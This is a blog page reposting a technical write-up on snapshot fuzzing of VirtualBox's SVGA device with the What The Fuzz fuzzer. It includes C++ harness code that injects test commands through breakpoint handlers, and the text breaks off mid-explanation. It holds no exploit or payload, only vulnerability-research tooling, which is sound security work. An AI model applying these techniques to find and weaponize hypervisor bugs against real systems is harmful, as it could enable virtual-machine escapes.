<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"usmacd.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="安全代码">
<meta property="og:url" content="http://usmacd.com/index.html">
<meta property="og:site_name" content="安全代码">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="henices">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://usmacd.com/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>安全代码</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">安全代码</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="henices"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">henices</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">61</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/henices" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;henices" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/henices" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;henices" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
      </span>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://scz.617.cn:8/" title="http:&#x2F;&#x2F;scz.617.cn:8&#x2F;" rel="noopener" target="_blank">飞花堂</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.v2ex.com/" title="https:&#x2F;&#x2F;www.v2ex.com&#x2F;" rel="noopener" target="_blank">V2EX</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.forecho.com/" title="https:&#x2F;&#x2F;blog.forecho.com&#x2F;" rel="noopener" target="_blank">forecho</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://chensenlin.cn/" title="https:&#x2F;&#x2F;chensenlin.cn&#x2F;" rel="noopener" target="_blank">你好我是森林</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/07/21/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/21/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/" class="post-title-link" itemprop="url">When Hypervisor Met Snapshot Fuzzing</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-21 16:00:00" itemprop="dateCreated datePublished" datetime="2022-07-21T16:00:00+08:00">2022-07-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>source: <a target="_blank" rel="noopener" href="https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html">https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html</a></p>
<h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>Hypervisor was known as hard target to fuzz over several years. Even though, lots of prior pioneers( <a target="_blank" rel="noopener" href="https://rezer0dai.github.io/biug-bounties/">Peter Hlavaty</a>, <a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2021ams/materials/D2T2%20-%20Discovering%2010+%20Vulnerabilities%20in%20Virtualbox%20-%20Chen%20Nan.pdf">Chaitin Tech</a>, <a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2020/04-adventures-in-hypervisor-oracle-virtualbox-research/#coverage-guided-fuzzing">StarLabs</a>, <a target="_blank" rel="noopener" href="https://github.com/SafeBreach-Labs/hAFL2">Peleg Hadar and Ophir Harpaz</a> and many others ) doing amazing work to overcome this limit and found interesting bugs.</p>
<p>But it is not an easy topic for some fresh newbie like me to starts from the bottom. I think manual code( or binary ) auditing and static analysis could be only considerable options if I start my research a few years ago without <strong>What The Fuzz</strong>.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf">What The Fuzz</a>( a.k.a WTF ) is a snapshot-based fuzzer targeting Windows Ring-3 and Ring-0 component. WTF’s snapshot is based on memory dump both kernel and user-land. Because of that, WTF can not emulate any functionality which requires anything not within in-memory and can not create new process or thread because memory dump limited on single process. But WTF support <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/bochscpu_backend.cc#L265">breakpoint Handler</a> which you can set breakpoint on <strong>any</strong> address within memory dump and if fuzz execution reaches that address, pre-defined breakpoint handler will be executed. Based on this, we can trying to overcome some limitation on WTF such as <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fshooks.cc">file access</a>.</p>
<p>I really love WTF’s flexibility and its potential, and I am going to show one of example usage of WTF on targeting Virtualbox to prove how awesome it is.</p>
<h1 id="2-Developing-Fuzz-Module"><a href="#2-Developing-Fuzz-Module" class="headerlink" title="2. Developing Fuzz Module"></a>2. Developing Fuzz Module</h1><p>First, you should define your own fuzz module for your target. There are few examples on github( <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">fuzzer_hevd.cc</a>, <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">fuzzer_tlv_server.cc</a> ) and blog post( <a target="_blank" rel="noopener" href="https://blog.ret2.io/2021/07/21/wtf-snapshot-fuzzing/">ret2systems</a>, <a target="_blank" rel="noopener" href="https://doar-e.github.io/blog/2021/07/15/building-a-new-snapshot-fuzzer-fuzzing-ida/">Doar-e</a> ). </p>
<p>My Target was Virtualbox’s <strong>SVGA</strong> component.</p>
<p>SVGA is something like “<a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/blog/2021/1/6/mindshare-analysis-of-vmware-workstation-and-esxi-using-debug-symbols-from-flings">JavaScript of hypervisors</a>“. Because of its complex nature, many hypervisor bugs are oriented by SVGA. And that’s the reason why I choose it as a first target.</p>
<p>VirtualBox have a function called <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4505">vmsvgaR3FifoLoop</a>. It <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4757">waits</a> until guest submit new command data through GPA. So this is a good spot( or should I call it <a target="_blank" rel="noopener" href="https://youtu.be/ZaOtY4i5w_U">source</a>? ) to take a snapshot.</p>
<p>I set a breakpoint on <code>vmsvgaR3FifoLoop+4E2</code> to take snapshot. It is same position as <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4783">here</a>, start of switch-case routine for <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Devices/Graphics/vmsvga_include/svga_reg.h#L152">SVGA</a> and <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Additions/3D/mesa/mesa-17.3.9/src/gallium/drivers/svga/include/svga3d_cmd.h#L56">SVGA3D</a> command.</p>
<p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah1.png" alt="blahblah1"></p>
<p>After creating snapshot, I had to decide make it <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">run multiple times in single execution</a> or <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">not</a>. Because SVGA is consist of various commands like define, update, delete something…, I thought fuzz campaign must handle multiple SVGA commands during single round.</p>
<p>First, I had to define structure to contains multiple testcases. Luckily, <a target="_blank" rel="noopener" href="https://twitter.com/0vercl0k">0vercl0k</a> already write <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/fuzzer_tlv_server.cc#L24-L75">nice example</a> to doing that. So I did same thing as below.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SVGA_CMD_BODY_MAX 0xA000</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> SvgaCmdList[] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">1040</span>, <span class="number">1041</span>, <span class="number">1042</span>, <span class="number">1043</span>, <span class="number">1044</span>, <span class="number">1046</span>, <span class="number">1047</span>, <span class="number">1048</span>, <span class="number">1049</span>, <span class="number">1050</span>, <span class="number">1051</span>, <span class="number">1052</span>, <span class="number">1053</span>, <span class="number">1054</span>, <span class="number">1055</span>, <span class="number">1056</span>, <span class="number">1057</span>, <span class="number">1058</span>, <span class="number">1059</span>, <span class="number">1060</span>, <span class="number">1061</span>, <span class="number">1062</span>, <span class="number">1063</span>, <span class="number">1064</span>, <span class="number">1065</span>, <span class="number">1066</span>, <span class="number">1067</span>, <span class="number">1068</span>, <span class="number">1069</span>, <span class="number">1070</span>, <span class="number">1071</span>, <span class="number">1072</span>, <span class="number">1073</span>, <span class="number">1074</span>, <span class="number">1075</span>, <span class="number">1076</span>, <span class="number">1077</span>, <span class="number">1078</span>, <span class="number">1079</span>, <span class="number">1080</span>, <span class="number">1081</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> SvgaCmdListLen = <span class="number">58</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SvgaCmd_t</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> SvgaCmdCode;</span><br><span class="line">  std::vector&lt;<span class="type">uint8_t</span>&gt; SvgaBody;</span><br><span class="line">  <span class="built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmd_t, SvgaCmdCode, SvgaBody);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SvgaCmds_t</span> &#123;</span><br><span class="line">  std::vector&lt;SvgaCmd_t&gt; SvgaCmds;</span><br><span class="line">  <span class="built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmds_t, SvgaCmds);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">  std::deque&lt;SvgaCmd_t&gt; SvgaCmds;</span><br><span class="line">  CpuState_t Context;</span><br><span class="line">  <span class="type">uint8_t</span> SvgaCmdBody[SVGA_CMD_BODY_MAX];</span><br><span class="line">  <span class="type">uint32_t</span> SvgaCmdBodySize;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">RestoreGprs</span><span class="params">(Backend_t *B)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;C = Context;</span><br><span class="line">    B-&gt;<span class="built_in">Rsp</span>(C.Rsp);</span><br><span class="line">    B-&gt;<span class="built_in">Rip</span>(C.Rip);</span><br><span class="line">    B-&gt;<span class="built_in">Rax</span>(C.Rax);</span><br><span class="line">    B-&gt;<span class="built_in">Rbx</span>(C.Rbx);</span><br><span class="line">    B-&gt;<span class="built_in">Rcx</span>(C.Rcx);</span><br><span class="line">    B-&gt;<span class="built_in">Rdx</span>(C.Rdx);</span><br><span class="line">    B-&gt;<span class="built_in">Rsi</span>(C.Rsi);</span><br><span class="line">    B-&gt;<span class="built_in">Rdi</span>(C.Rdi);</span><br><span class="line">    B-&gt;<span class="built_in">R8</span>(C.R8);</span><br><span class="line">    B-&gt;<span class="built_in">R9</span>(C.R9);</span><br><span class="line">    B-&gt;<span class="built_in">R10</span>(C.R10);</span><br><span class="line">    B-&gt;<span class="built_in">R11</span>(C.R11);</span><br><span class="line">    B-&gt;<span class="built_in">R12</span>(C.R12);</span><br><span class="line">    B-&gt;<span class="built_in">R13</span>(C.R13);</span><br><span class="line">    B-&gt;<span class="built_in">R14</span>(C.R14);</span><br><span class="line">    B-&gt;<span class="built_in">R15</span>(C.R15);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; GlobalState;</span><br><span class="line"></span><br><span class="line"><span class="function">SvgaCmds_t <span class="title">Deserialize</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Buffer, <span class="type">const</span> <span class="type">size_t</span> BufferSize)</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> &amp;Root = json::json::<span class="built_in">parse</span>(Buffer, Buffer + BufferSize);</span><br><span class="line">  <span class="keyword">return</span> Root.<span class="built_in">get</span>&lt;SvgaCmds_t&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertTestcase</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Buffer, <span class="type">const</span> <span class="type">size_t</span> BufferSize)</span> </span>&#123;</span><br><span class="line">  GlobalState.SvgaCmds.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> &amp;Root = <span class="built_in">Deserialize</span>(Buffer, BufferSize);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> SvgaCmd : Root.SvgaCmds) &#123;</span><br><span class="line">    GlobalState.SvgaCmds.<span class="built_in">emplace_back</span>(std::<span class="built_in">move</span>(SvgaCmd));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It is almost identical as example.</p>
<p>Next question was, how can I insert data into snapshot? I had to find a insertion point and proper memory address. Luckily( again ), VirtualBox using a function called <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4183">vmsvgaR3FifoGetCmdPayload</a> to receive command data from guest to host. I define a breakpoint handler in <code>Init()</code> callback function as below.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// unsigned __int8 *__fastcall vmsvgaR3FifoGetCmdPayload(</span></span><br><span class="line"><span class="comment">//       unsigned int cbPayloadReq,</span></span><br><span class="line"><span class="comment">//       volatile unsigned int *pFIFO,</span></span><br><span class="line"><span class="comment">//       unsigned int offCurrentCmd,</span></span><br><span class="line"><span class="comment">//       unsigned int offFifoMin,</span></span><br><span class="line"><span class="comment">//       unsigned int offFifoMax,</span></span><br><span class="line"><span class="comment">//       unsigned __int8 *pbBounceBuf,</span></span><br><span class="line"><span class="comment">//       unsigned int *pcbAlreadyRead,</span></span><br><span class="line"><span class="comment">//       PDMTHREAD *pThread,</span></span><br><span class="line"><span class="comment">//       VGAState *pThis,</span></span><br><span class="line"><span class="comment">//       VMSVGAR3STATE *pSVGAState,</span></span><br><span class="line"><span class="comment">//       PDMDEVINSR3 *pDevIns)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoGetCmdPayload&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="type">uint32_t</span> cbPayloadReq = Backend-&gt;<span class="built_in">GetArg</span>(<span class="number">0</span>);</span><br><span class="line">  Gva_t pbBounceBuf_gva = Backend-&gt;<span class="built_in">GetArgGva</span>(<span class="number">5</span>);</span><br><span class="line">  Gva_t pcbAlreadyRead_gva = Backend-&gt;<span class="built_in">GetArgGva</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(cbPayloadReq &gt; GlobalState.SvgaCmdBodySize) &#123;</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;cbpayloadReq(&#123;:#x&#125;) &gt; SvgaCmdBodySize(&#123;:#x&#125;), restore context and goto next round\n&quot;</span>, cbPayloadReq, GlobalState.SvgaCmdBodySize);</span><br><span class="line">    <span class="keyword">return</span> GlobalState.<span class="built_in">RestoreGprs</span>(Backend);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(cbPayloadReq &gt; u32PbBounceBufMaxSize) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> RetAddr = Backend-&gt;<span class="built_in">VirtRead8</span>(<span class="built_in">Gva_t</span>(Backend-&gt;<span class="built_in">Rsp</span>()));</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;check this, RetAddr = &#123;:#x&#125;\n&quot;</span>, RetAddr);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!Backend-&gt;<span class="built_in">VirtWriteDirty</span>(pbBounceBuf_gva, GlobalState.SvgaCmdBody, cbPayloadReq)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to write pbBounceBuf, pbBounceBuf = &#123;:#x&#125;, cbPayloadReq = &#123;:#x&#125;, SvgaCmdBodySize = &#123;:#x&#125;\n&quot;</span>,</span><br><span class="line">                pbBounceBuf_gva.<span class="built_in">U64</span>(), cbPayloadReq, GlobalState.SvgaCmdBodySize);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!Backend-&gt;<span class="built_in">VirtWriteStructDirty</span>(pcbAlreadyRead_gva, &amp;cbPayloadReq)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Faile to write pcbAlreadyRead, pcbAlreadyRead = &#123;:#x&#125;\n&quot;</span>, pcbAlreadyRead_gva.<span class="built_in">U64</span>());</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(pbBounceBuf_gva.<span class="built_in">U64</span>());</span><br><span class="line"></span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on VBoxDD!vmsvgaR3FifoGetCmdPayload\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I also had to define end point of execution. After some reversing, I found two spots and using it as end point.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Gva_t SvgaLoopEnd = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x24AB</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgaLoopEnd, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;loop end reached, restore context\n&quot;</span>);</span><br><span class="line">  GlobalState.<span class="built_in">RestoreGprs</span>(g_Backend);</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgaLoopEnd\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> Gva_t SvgLoopEnd2 = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x24B2</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgLoopEnd2, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;loop end2 reached, restore context\n&quot;</span>);</span><br><span class="line">  GlobalState.<span class="built_in">RestoreGprs</span>(g_Backend);</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgLoopEnd2\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As I said above, I create a snapshot on <code>vmsvgaR3FifoLoop+4E2</code>. So if I restore register context, next execution flow starts from there. Because of that, I had to parse new testcase using breakpoint Handler.</p>
